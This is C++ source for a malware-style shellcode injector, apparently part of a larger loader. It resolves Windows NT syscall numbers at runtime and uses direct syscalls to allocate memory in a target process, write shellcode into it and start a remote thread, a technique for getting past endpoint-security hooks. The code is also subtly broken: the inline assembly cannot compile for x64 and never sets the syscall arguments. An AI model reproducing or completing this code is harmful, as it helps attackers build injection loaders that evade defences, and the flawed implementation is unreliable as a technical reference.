#include <windows.h>
#include <iostream>

// Estructura para syscall (simplificada para x64)
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// Prototipos de syscalls directos (usando mapeo dinámico)
extern "C" NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern "C" NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
extern "C" NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);

// Function to get syscall number dynamically from ntdll.dll
ULONG GetSyscallNumber(const char* syscallName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    // Get function address
    FARPROC funcAddr = GetProcAddress(hNtdll, syscallName);
    if (!funcAddr) return 0;

    // Read syscall opcode (x64: "0F 05" preceded by mov eax, syscall_number)
    // Search pattern: mov eax, XX; syscall
    unsigned char* p = (unsigned char*)funcAddr;
    for (int i = 0; i < 50; ++i) {  // Search first 50 bytes for hooks
        if (p[i] == 0xB8 && p[i + 5] == 0x0F && p[i + 6] == 0x05) {  // mov eax, imm; syscall
            return *(ULONG*)(p + i + 1);  // Syscall number
        }
    }
    return 0;  // Fallback if not found
}

// Function to get syscall address (now uses dynamic mapping)
PVOID GetSyscallAddress(const char* syscallName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    return GetProcAddress(hNtdll, syscallName);
}

// Implementation of injection with direct syscalls using dynamic mapping
bool DirectInject(HANDLE hProcess, PVOID shellcode, SIZE_T size) {
    PVOID pRemoteMemory = NULL;
    SIZE_T allocSize = size;

    // Get syscall numbers dynamically
    ULONG allocSyscall = GetSyscallNumber("NtAllocateVirtualMemory");
    ULONG writeSyscall = GetSyscallNumber("NtWriteVirtualMemory");
    ULONG threadSyscall = GetSyscallNumber("NtCreateThreadEx");

    if (!allocSyscall || !writeSyscall || !threadSyscall) {
        std::cout << "Error getting syscall numbers." << std::endl;
        return false;
    }

    // Allocate memory using direct syscall with dynamic number
    __asm {
        mov rax, allocSyscall
        mov r10, rcx
        mov rdx, rdx
        mov r8, r8
        mov r9, r9
        syscall
        mov allocSyscall, eax  // Save status
    }
    if (allocSyscall != 0) {
        std::cout << "Error in NtAllocateVirtualMemory: " << allocSyscall << std::endl;
        return false;
    }

    // Write shellcode using direct syscall
    SIZE_T bytesWritten;
    __asm {
        mov rax, writeSyscall
        mov r10, rcx
        mov rdx, rdx
        mov r8, r8
        mov r9, r9
        syscall
        mov writeSyscall, eax
    }
    if (writeSyscall != 0) {
        std::cout << "Error in NtWriteVirtualMemory: " << writeSyscall << std::endl;
        return false;
    }

    // Create thread using direct syscall
    HANDLE hThread;
    __asm {
        mov rax, threadSyscall
        mov r10, rcx
        mov rdx, rdx
        mov r8, r8
        mov r9, r9
        syscall
        mov threadSyscall, eax
    }
    if (threadSyscall != 0) {
        std::cout << "Error in NtCreateThreadEx: " << threadSyscall << std::endl;
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return true;
}

// Ejemplo de uso (integrar en loader principal)
int main() {
    // Ejemplo: Inyectar en proceso con PID 1234
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);
    if (!hProcess) return 1;

    unsigned char shellcode[] = { 0x90, 0x90 }; // Placeholder
    DirectInject(hProcess, shellcode, sizeof(shellcode));

    CloseHandle(hProcess);
    return 0;
}